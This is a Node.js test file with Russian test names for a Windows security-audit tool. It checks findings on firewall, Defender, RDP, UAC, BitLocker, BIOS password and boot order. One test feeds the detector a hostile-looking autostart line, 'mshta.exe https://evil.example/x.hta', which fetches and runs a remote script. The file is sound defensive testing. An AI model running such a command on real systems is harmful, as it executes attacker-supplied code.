'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { evaluate, summarize, suspiciousReason, avEnabled } = require('../server/rules');
const { good, bad, NOW } = require('./fixtures/facts');

const byId = (list) => new Map(list.map((f) => [f.id, f]));

test('хорошо настроенный компьютер: ни одной критичной или важной находки', () => {
  const list = evaluate(good(), { now: NOW });
  const s = summarize(list);
  assert.equal(s.critical, 0, JSON.stringify(list.filter((f) => f.sev === 'critical')));
  assert.equal(s.high, 0, JSON.stringify(list.filter((f) => f.sev === 'high')));
  const ids = byId(list);
  for (const id of ['firewall-ok', 'defender-ok', 'smb1-ok', 'rdp-off', 'uac-ok', 'updates-ok', 'bitlocker-ok', 'secureboot-ok', 'tpm-ok', 'bios-password-ok']) {
    assert.ok(ids.has(id), `нет находки ${id}`);
  }
});

test('плохо настроенный компьютер: правильные находки и важность', () => {
  const ids = byId(evaluate(bad(), { now: NOW }));
  const expect = {
    'firewall-off': 'critical', 'defender-off': 'critical', 'defender-tamper': 'advice', smb1: 'high', 'smb-shares': 'advice',
    'rdp-no-nla': 'critical', 'uac-off': 'critical', 'port-23': 'critical', 'port-6379': 'high', 'port-smb-nofw': 'high',
    'guest-on': 'high', 'admin-builtin-on': 'advice', 'password-not-required': 'high', 'autologon-password': 'high',
    'admins-many': 'advice', 'updates-disabled': 'critical', 'updates-old': 'critical', 'updates-reboot': 'advice',
    'bitlocker-off': 'high', 'secureboot-off': 'high', 'tpm-missing': 'advice', 'bios-password-none': 'high', 'bios-old': 'advice',
    'boot-order-unknown': 'unknown', 'ports-apps': 'advice',
  };
  for (const [id, sev] of Object.entries(expect)) {
    assert.ok(ids.has(id), `нет находки ${id}`);
    assert.equal(ids.get(id).sev, sev, id);
  }
});

test('находки, которые можно исправить, ссылаются на исправление; прочие - на инструкцию', () => {
  const ids = byId(evaluate(bad(), { now: NOW }));
  assert.equal(ids.get('firewall-off').fix.id, 'firewall-on');
  assert.equal(ids.get('rdp-no-nla').fix.id, 'rdp-nla');
  assert.equal(ids.get('rdp-no-nla').alt[0].id, 'rdp-off');
  assert.equal(ids.get('uac-off').fix.id, 'uac-on');
  assert.equal(ids.get('admin-builtin-on').fix.arg.userSid, bad().meta.userSid);
  assert.equal(ids.get('bitlocker-off').guide, 'bitlocker');
  assert.equal(ids.get('bios-password-none').guide, 'bios-password');
  assert.equal(ids.get('bios-password-none').fix, undefined, 'пароль BIOS программа не ставит');
  assert.equal(ids.get('secureboot-off').fix, undefined, 'Secure Boot программа не меняет');
});

test('подозрительная автозагрузка: временная папка и закодированный PowerShell', () => {
  const list = evaluate(bad(), { now: NOW });
  const sus = list.filter((f) => f.id.startsWith('autostart-suspicious-'));
  assert.equal(sus.length, 2);
  assert.ok(sus.every((f) => f.fix && f.fix.id === 'autostart-off' && f.fix.arg.loc && f.fix.arg.name));
  assert.ok(suspiciousReason('mshta.exe https://evil.example/x.hta'));
  assert.equal(suspiciousReason('"C:\\Program Files\\App\\app.exe" /min'), null);
});

test('пароль BIOS: прошивка молчит - «не видно», а не «в порядке»', () => {
  const f = good();
  f.firmware.adminPasswordStatus = 3;
  const ids = byId(evaluate(f, { now: NOW }));
  assert.equal(ids.get('bios-password-unknown').sev, 'unknown');
  f.firmware.vendor = { source: 'Lenovo', admin: false, powerOn: false };
  assert.equal(byId(evaluate(f, { now: NOW })).get('bios-password-none').sev, 'high');
});

test('порядок загрузки после полной проверки: флешка первой - совет', () => {
  const f = good();
  f.boot.bcdFirmware = `Firmware Boot Manager
---------------------
identifier              {fwbootmgr}
displayorder            {a1}
                        {bootmgr}

Windows Boot Manager
--------------------
identifier              {bootmgr}
description             Windows Boot Manager

Firmware Application (101fffff)
-------------------------------
identifier              {a1}
description             UEFI: SanDisk USB Drive
`;
  assert.equal(byId(evaluate(f, { now: NOW })).get('boot-order-external').sev, 'advice');
});

test('Defender в пассивном режиме при другом антивирусе - в порядке', () => {
  const f = good();
  f.defender.status.realTime = false;
  f.defender.status.mode = 'Passive Mode';
  f.defender.products.push({ name: 'Kaspersky', state: 266240 });
  assert.ok(avEnabled(266240));
  const ids = byId(evaluate(f, { now: NOW }));
  assert.ok(!ids.has('defender-off'));
  assert.equal(ids.get('av-other').sev, 'ok');
});

test('нет раздела сведений (ошибка сбора) - находка «не видно», без падения', () => {
  const f = good();
  delete f.firewall;
  delete f.defender;
  f.errors = { firewall: 'Access denied' };
  const list = evaluate(f, { now: NOW });
  assert.equal(byId(list).get('firewall-unknown').sev, 'unknown');
  assert.equal(byId(list).get('defender-unknown').sev, 'unknown');
  assert.doesNotThrow(() => evaluate({}, { now: NOW }));
});

test('PowerShell отдал одиночный объект вместо массива - правила это переносят', () => {
  const f = good();
  f.accounts.users = f.accounts.users[2];
  f.firewall.profiles = f.firewall.profiles[0];
  f.autostart.items = f.autostart.items[0];
  assert.doesNotThrow(() => evaluate(f, { now: NOW }));
});
